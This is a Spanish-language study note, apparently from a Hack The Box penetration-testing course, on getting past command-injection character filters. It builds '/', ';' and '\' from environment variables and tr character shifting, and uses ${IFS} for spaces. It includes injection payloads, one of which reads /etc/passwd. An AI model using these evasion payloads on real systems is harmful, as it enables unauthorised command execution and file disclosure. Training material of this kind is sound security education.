---
tags:
  - bypass
  - webapp
  - RCE
  - commandinjection
---
## Conceptos Clave (TL;DR)

- Los filtros de entrada suelen blacklistear caracteres como `/`, `\`, `;` y espacios. El objetivo es producir esos caracteres sin escribirlos literalmente en el payload.
- En Linux, las variables de entorno (`$PATH`, `$HOME`, `$LS_COLORS`) contienen estos caracteres; se puede extraer cualquier carácter individual usando la sintaxis de substring `${VAR:START:LENGTH}`.
- En Windows CMD se usa la sintaxis `%VAR:~START,END%` y en PowerShell `$env:VAR[INDEX]` para el mismo propósito.
- La técnica de "Character Shifting" usa `tr` para desplazar un carácter en la tabla ASCII y producir el carácter objetivo sin escribirlo directamente.

## Herramientas Clave

- `printenv` — Lista todas las variables de entorno en Linux; útil para identificar variables que contengan los caracteres necesarios.
- `man ascii` — Consulta la tabla ASCII para identificar el carácter previo al objetivo (necesario para la técnica de shifting).
- `tr` — Transliteración de caracteres en Linux; se usa para aplicar el desplazamiento ASCII.
- `Get-ChildItem Env:` — Equivalente PowerShell de `printenv`; lista todas las variables de entorno en Windows.

## Metodología Paso a Paso

### Fase 1: Identificar los caracteres bloqueados

Antes de construir el payload, identificar qué caracteres filtra la aplicación enviando peticiones de prueba. Los más comunes son: `/`, `\`, `;`, espacio.

### Fase 2: Localizar el carácter en una variable de entorno (Linux)

Buscar en las variables de entorno del sistema cuál contiene el carácter necesario y en qué posición, para luego extraerlo con substring.

```bash
# Imprimir el valor de PATH para ver qué caracteres contiene y en qué posición
echo ${PATH}

# Extraer el carácter '/' desde la posición 0 con longitud 1
echo ${PATH:0:1}

# Imprimir todas las variables de entorno para buscar caracteres útiles
printenv

# Extraer el carácter ';' desde LS_COLORS (posición 10, longitud 1)
echo ${LS_COLORS:10:1}
```

> La logica: `${VAR:START:LENGTH}` es expansion de substring en Bash. No se escribe el caracter, solo se referencia desde la variable.

### Fase 3: Construir el payload con los caracteres sustitutos (Linux)

Reemplazar el caracter bloqueado directamente en el payload con la referencia a la variable de entorno.

```bash
# Payload de ejemplo: sustituir ';' con ${LS_COLORS:10:1} y espacio con ${IFS}
# Estructura: <IP>${LS_COLORS:10:1}${IFS}<COMMAND>
<TARGET_IP>${LS_COLORS:10:1}${IFS}whoami
```

### Fase 4: Técnica equivalente en Windows CMD

Usar la expansion de variables de entorno de CMD para extraer un carácter por posición.

```cmd
# Extraer '\' de %HOMEPATH% (ej: \Users\htb-student), inicio en 6, fin relativo -11
# Ajustar START y END segun la longitud real del username en el sistema objetivo
echo %HOMEPATH:~6,-11%
```

> La logica: `%VAR:~START,END%` — START es posicion inicial, END negativo indica cuantos caracteres omitir desde el final.

### Fase 5: Tecnica equivalente en Windows PowerShell

Acceder al carácter por índice de array sobre la variable de entorno.

```powershell
# Extraer '\' como primer carácter (índice 0) de HOMEPATH
$env:HOMEPATH[0]

# Listar todas las variables de entorno para buscar caracteres útiles
Get-ChildItem Env:

# Extraer carácter en posicion 10 de PROGRAMFILES
$env:PROGRAMFILES[10]
```

### Fase 6: Character Shifting (Linux)

Cuando no se encuentra el carácter en una variable, usar `tr` para desplazarlo desde el carácter anterior en la tabla ASCII.

```bash
# Consultar tabla ASCII para encontrar el carácter PREVIO al objetivo
man ascii
# Ejemplo: '\' = decimal 92 → el anterior es '[' = decimal 91

# Sintaxis de shifting: tr desplaza el rango '!-}' a '"-~' (shift +1)
# Sustituir '[' por el carácter que precede al objetivo en ASCII
echo $(tr '!-}' '"-~'<<<[)
# Output: '\'

# Para producir ';' (decimal 59), el carácter anterior es ':' (decimal 58)
echo $(tr '!-}' '"-~'<<<:)
# Output: ';'
```

> La logica: `tr '!-}' '"-~'` mapea cada carácter del rango ASCII 33-125 al siguiente. Pasando el carácter N-1, obtenemos N como salida.

## Cheat Sheet de Comandos

```bash
# --- LINUX: Extraccion de caracteres desde variables de entorno ---

# Ver contenido de PATH para identificar posicion de '/'
echo ${PATH}

# Extraer '/' (posicion 0, longitud 1 de PATH)
echo ${PATH:0:1}

# Extraer ';' (posicion 10, longitud 1 de LS_COLORS)
echo ${LS_COLORS:10:1}

# Listar TODAS las variables de entorno para buscar caracteres utiles
printenv

# Payload completo sustituyendo ';' y espacio en injection de IP
# Reemplazar <TARGET_IP> y <COMMAND> segun el contexto del examen
<TARGET_IP>${LS_COLORS:10:1}${IFS}<COMMAND>

# Payload sustituyendo '/' para traversal de directorios
# Ejemplo: cat /etc/passwd → cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
```

```bash
# --- LINUX: Character Shifting con tr ---

# Consultar tabla ASCII (buscar decimal del caracter objetivo y restar 1)
man ascii

# Producir '\' (92 decimal): caracter previo es '[' (91 decimal)
echo $(tr '!-}' '"-~'<<<[)

# Producir ';' (59 decimal): caracter previo es ':' (58 decimal)
echo $(tr '!-}' '"-~'<<<:)

# Producir '/' (47 decimal): caracter previo es '.' (46 decimal)
echo $(tr '!-}' '"-~'<<<.)
```

```cmd
:: --- WINDOWS CMD: Extraccion de caracteres desde variables de entorno ---

:: Extraer '\' de HOMEPATH ajustando START y END a la longitud del usuario
:: Formato: %VAR:~START,END% (END negativo = omitir N chars desde el final)
:: Ajustar -11 segun la longitud real del username en <TARGET>
echo %HOMEPATH:~6,-11%

:: Ver valor completo de HOMEPATH para calcular posiciones
echo %HOMEPATH%
```

```powershell
# --- WINDOWS POWERSHELL: Extraccion de caracteres por indice ---

# Extraer '\' como indice 0 de HOMEPATH
$env:HOMEPATH[0]

# Extraer caracter en posicion 10 de PROGRAMFILES
$env:PROGRAMFILES[10]

# Listar todas las variables de entorno para buscar caracteres utiles
Get-ChildItem Env:
```

## "Gotchas" y Troubleshooting

- **No agregar `echo` en el payload final**: Los ejemplos del modulo usan `echo` solo para demostrar el caracter resultante en la terminal. En el payload real, la referencia a la variable se usa directamente sin `echo`.
- **La posicion en `${LS_COLORS:10:1}` puede variar**: El caracter `;` estara en esa posicion en sistemas HTB, pero en otros entornos la variable `LS_COLORS` puede tener un valor diferente. Verificar siempre con `printenv` antes de asumir la posicion.
- **`%HOMEPATH:~6,-11%` es dependiente del username**: El valor `-11` corresponde exactamente a la longitud del usuario `htb-student`. En el examen, el nombre de usuario del objetivo sera diferente, por lo que se debe recalcular el offset negativo.
- **`${IFS}` solo sustituye espacios**, no otros caracteres. No intentar usarlo para producir `/` o `;`.
- **Character Shifting requiere que el caracter previo NO este bloqueado**: Si el filtro bloquea el caracter que se pasa a `tr` (ej. `[`), esta tecnica tampoco funcionara directamente. Probar con otros caracteres del rango.
- **Prerequisito general**: Estas tecnicas aplican en escenarios donde ya existe una inyeccion de comandos parcial (command injection) y el problema es evadir el filtro de caracteres, no encontrar la inyeccion en si misma.
- **Windows PowerShell vs CMD**: La sintaxis es completamente diferente entre ambos. Identificar primero si el backend ejecuta CMD (`cmd.exe`) o PowerShell antes de elegir la tecnica.
- **Tecnica de shifting en PowerShell**: Es posible pero los comandos son mas largos y complejos que en Linux. Preferir la extraccion por variable de entorno en Windows.